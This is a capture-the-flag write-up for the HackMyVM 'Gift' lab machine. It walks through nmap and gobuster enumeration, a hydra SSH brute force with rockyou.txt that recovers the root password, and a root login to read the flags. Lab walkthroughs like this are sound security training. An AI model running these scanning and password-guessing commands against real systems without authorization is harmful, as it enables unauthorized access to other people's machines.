# Gift Writeup
 
Writeup on a gift from pretty cool site hackmyvm.eu!
 
According to the decription:
 
`A really easy VM. Thats a gift :)`
 
VM: https://hackmyvm.eu/machines/machine.php?vm=Gift
 
## enumeration
We start by identifying the machine
 
Started with a quick nmap scan to determine the machine's ip address
 
```
nmap 10.0.0.0/24 -F
```
 
The scan resulted in the following report
```
Nmap scan report for 10.0.0.122
Host is up (0.00052s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:DB:0A:26 (Oracle VirtualBox virtual NIC)
```
 
Now that we now our target's IP address, lets check all TCP ports
```
sudo nmap -sV 10.0.0.122 -p-
```
The report
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 18:18 CST
Nmap scan report for 10.0.0.122
Host is up (0.000085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx
MAC Address: 08:00:27:DB:0A:26 (Oracle VirtualBox virtual NIC)
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
 
```
So we have SSH and HTTP services running and with open ports, let's check them out.
 
OpenSSH, we check for any exploit in that reported OpenSSH version but nothing juicy comes up just now. Let's continue with our findings before resorting to bruteforcing yet.
 
We also detected port 80 open, however there is no version to check for any version related exploits.
 
But let's not get discouraged, lets check whats hosted for us by nginx.
 
```
curl http://10.0.0.122 
```
 
And we get the following response... and the plot chickens.
 
```
Dont Overthink. Really, Its simple.
        <!-- Trust me -->
 
```
If you say so.. hehe.
So far we just got good hopes and curiosity.
 
Im interested in the HTTP server, which has given us some easy interaction.
 
Lets find out if there are more secrets in that HTTP server.
 
 
```
gobuster dir --url http://10.0.0.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```
Using gobuster in directory mode with directory-list-2.3-medium.txt as the wordlist returned the following report
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.0.122
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
 
```
Nothing, awesome. We gave it a shot, lets put apin in it.
 
Just to make sure we are not missing any other services, we make a UDP scan but nothing interesting comes up
```
sudo nmap -sU 10.0.0.122
```
Seeing this, we will put our attention in the OpenSSH server
 
## bruteforce
As no more details have been found yet. We will begin by bruteforcing the login guessing that the "root" user has remote access.
 
using -l to specify our target username, -P to specify a wordlist, in this case, rockyou.txt
 
```
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.0.0.122 ssh -t 4
```
Results
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-01 18:47:50
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.0.0.122:22/
[22][ssh] host: 10.0.0.122   login: root   password: simple
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-01 18:47:59
 
```
 
## Verify Access
Now we have a user and password to log into the machine.
```
ssh root@10.0.0.122
#password: simple
```
 
```
root@192.168.100.122's password: 
IM AN SSH SERVER
gift:~# whoami
root
 
```
Success! we are in as root.
 
## Exfiltrate data
Lets find what we are looking for.
 
```
gift:~# ls
root.txt  user.txt
 
```
Right there you can see our gifts ready to be collected.
```
gift:~# cat user.txt
gift:~# cat root.txt
 
```
 
so it was "simple" since the very beggining, amazing!
